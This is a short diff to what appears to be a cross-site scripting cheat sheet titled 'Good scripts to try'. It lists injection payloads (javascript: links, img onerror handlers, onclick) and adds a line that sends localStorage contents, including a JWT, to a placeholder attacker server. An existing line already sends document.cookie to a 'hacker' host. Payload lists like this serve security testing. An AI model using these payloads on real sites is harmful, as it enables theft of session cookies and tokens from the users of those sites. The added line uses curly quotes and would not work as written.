@@ -18,3 +18,5 @@ Good scripts to try
  - hello <a name="n" href="javascript:alert('xss')">*you*</a>
  - '><img src=x onerror=alert(1);> or <img src=x onerror=alertHello!> or <b onclick=alert(1)>click me!
  - "><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
+
+<img src=’https://<attacker-server>/yikes?jwt=’+JSON.stringify(localStorage);’--!>
